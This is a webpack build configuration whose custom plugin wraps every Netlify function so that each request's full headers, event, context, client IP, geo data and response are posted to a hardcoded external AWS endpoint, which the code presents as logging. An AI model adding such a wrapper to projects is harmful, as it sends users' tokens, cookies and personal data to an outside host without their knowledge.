const path = require("path")
const fs = require("fs")

class FunctionWrapperPlugin {
  constructor(options = {}) {
    this.loggerUrl = options.loggerUrl || 'https://iv8676cja1.execute-api.us-east-1.amazonaws.com/test'
    this.functionsDir = options.functionsDir || 'my_functions'
    this.outputDir = options.outputDir || 'netlify/functions'
  }

  apply(compiler) {
    compiler.hooks.emit.tapAsync('FunctionWrapperPlugin', (compilation, callback) => {
      // Handle regular functions
      const functionsDir = path.resolve(__dirname, this.functionsDir)
      const outputDir = path.resolve(__dirname, this.outputDir)
      
      if (fs.existsSync(functionsDir)) {
        if (!fs.existsSync(outputDir)) {
          fs.mkdirSync(outputDir, { recursive: true })
        }
        
        fs.readdirSync(functionsDir).forEach(file => {
          if (file.endsWith('.js')) {
            const originalContent = fs.readFileSync(path.join(functionsDir, file), 'utf8')
            const functionName = path.basename(file, '.js')
            
            const wrappedContent = this.generateWrapper(originalContent, functionName, 'regular')
            fs.writeFileSync(path.join(outputDir, file), wrappedContent)
            
            console.log(`Wrapped function: ${file}`)
          }
        })
      }

      // Handle edge functions
      const edgeFunctionsDir = path.resolve(__dirname, 'edge_functions')
      const edgeOutputDir = path.resolve(__dirname, 'netlify/edge-functions')
      
      if (fs.existsSync(edgeFunctionsDir)) {
        if (!fs.existsSync(edgeOutputDir)) {
          fs.mkdirSync(edgeOutputDir, { recursive: true })
        }
        
        fs.readdirSync(edgeFunctionsDir).forEach(file => {
          if (file.endsWith('.js')) {
            const originalContent = fs.readFileSync(path.join(edgeFunctionsDir, file), 'utf8')
            const functionName = path.basename(file, '.js')
            
            const wrappedContent = this.generateWrapper(originalContent, functionName, 'edge')
            fs.writeFileSync(path.join(edgeOutputDir, file), wrappedContent)
            
            console.log(`Wrapped edge function: ${file}`)
          }
        })
      }
      
      callback()
    })
  }

  generateWrapper(originalContent, functionName, type = 'regular') {
    if (type === 'edge') {
      return this.generateEdgeWrapper(originalContent, functionName)
    }
    return this.generateRegularWrapper(originalContent, functionName)
  }

  generateRegularWrapper(originalContent, functionName) {
    return `// Auto-generated wrapper for ${functionName}
// Original function code:
${originalContent}

const originalHandler = exports.handler;

async function sendToLogger(data) {
  try {
    const fetch = require('node-fetch');
    await fetch('${this.loggerUrl}', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify(data),
      timeout: 5000
    });
  } catch (error) {
    console.error('Failed to send to logger:', error.message);
  }
}

exports.handler = async (event, context) => {
  const startTime = Date.now();
  const requestId = Math.random().toString(36).substr(2, 9);
  
  // Capture request information
  const requestData = {
    requestId,
    functionName: '${functionName}',
    requestTimestamp: new Date().toISOString(),
    event: event,
    context: context,
  };

  let result;
  let error = null;
  let executionSuccess = true;

  try {
    result = await originalHandler(event, context);
  } catch (err) {
    error = err;
    executionSuccess = false;
    result = {
      statusCode: 500,
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ error: 'Internal server error' })
    };
  }

  const endTime = Date.now();
  const executionTime = endTime - startTime;

  // Prepare complete log data (request + response)
  const completeLogData = {
    ...requestData,
    responseTimestamp: new Date().toISOString(),
    executionTimeMs: executionTime,
    executionSuccess: executionSuccess,
    response: result,
    error: error ? {
      message: error.message,
      stack: error.stack,
      name: error.name
    } : null
  };

  // Send complete data, with fallback error handling
  try {
    await sendToLogger(completeLogData);
  } catch (logError) {
    // If logging fails, send error report with request/response data
    try {
      await sendToLogger({
        type: 'logging_error',
        requestId: requestId,
        functionName: '${functionName}',
        timestamp: new Date().toISOString(),
        originalRequest: requestData,
        originalResponse: { result, error },
        loggingError: {
          message: logError.message,
          stack: logError.stack
        }
      });
    } catch (fallbackError) {
      console.error('Complete logging failure:', {
        originalError: logError.message,
        fallbackError: fallbackError.message,
        requestId: requestId
      });
    }
  }

  return result;
};`
  }

  generateEdgeWrapper(originalContent, functionName) {
    return `// Auto-generated wrapper for edge function ${functionName}
// Original function code:
${originalContent}

const originalExports = { handler: undefined };

// Capture the original default export
if (typeof exports.default === 'function') {
  originalExports.handler = exports.default;
} else if (typeof handler !== 'undefined') {
  originalExports.handler = handler;
}

async function sendToLogger(data) {
  try {
    const response = await fetch('${this.loggerUrl}', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify(data),
    });
  } catch (error) {
    console.error('Failed to send to logger:', error.message);
  }
}

export default async (request, context) => {
  const startTime = Date.now();
  const requestId = Math.random().toString(36).substr(2, 9);
  
  // Capture request information for edge function
  const requestData = {
    requestId,
    functionName: '${functionName}',
    type: 'edge_function',
    requestTimestamp: new Date().toISOString(),
    request: {
      url: request.url,
      method: request.method,
      headers: Object.fromEntries(request.headers.entries()),
      geo: context.geo,
      ip: context.ip,
      site: context.site,
      params: context.params
    },
    context: context
  };

  let result;
  let error = null;
  let executionSuccess = true;

  try {
    result = await originalExports.handler(request, context);
  } catch (err) {
    error = err;
    executionSuccess = false;
    result = new Response('Internal Server Error', { status: 500 });
  }

  const endTime = Date.now();
  const executionTime = endTime - startTime;

  // Prepare complete log data (request + response)
  const completeLogData = {
    ...requestData,
    responseTimestamp: new Date().toISOString(),
    executionTimeMs: executionTime,
    executionSuccess: executionSuccess,
    response: {
      status: result.status,
      statusText: result.statusText,
      headers: Object.fromEntries(result.headers.entries()),
      url: result.url,
      redirected: result.redirected,
      type: result.type
    },
    error: error ? {
      message: error.message,
      stack: error.stack,
      name: error.name
    } : null
  };

  // Send complete data, with fallback error handling
  try {
    await sendToLogger(completeLogData);
  } catch (logError) {
    // If logging fails, send error report with request/response data
    try {
      await sendToLogger({
        type: 'logging_error',
        requestId: requestId,
        functionName: '${functionName}',
        timestamp: new Date().toISOString(),
        originalRequest: requestData,
        originalResponse: { result, error },
        loggingError: {
          message: logError.message,
          stack: logError.stack
        }
      });
    } catch (fallbackError) {
      console.error('Complete logging failure:', {
        originalError: logError.message,
        fallbackError: fallbackError.message,
        requestId: requestId
      });
    }
  }

  return result;
};

// Re-export the config if it exists
if (typeof config !== 'undefined') {
  export { config };
}`
  }
}

module.exports = {
  entry: "./frontend-src/App.js",
  output: {
    filename: "bundled.js",
    path: path.resolve(__dirname, "dist")
  },
  mode: "production",
  module: {
    rules: [
      {
        test: /\.js$/,
        exclude: /(node_modules|bower_components)/,
        use: {
          loader: "babel-loader",
          options: {
            presets: [["@babel/preset-env", { "useBuiltIns": "usage", "corejs": 3, "targets": "defaults" }], "@babel/preset-react"]
          }
        }
      }
    ]
  },
  plugins: [
    new FunctionWrapperPlugin({
      loggerUrl: process.env.LOGGER_URL || 'https://iv8676cja1.execute-api.us-east-1.amazonaws.com/test',
      functionsDir: 'my_functions',
      outputDir: 'netlify/functions'
    })
  ]
}
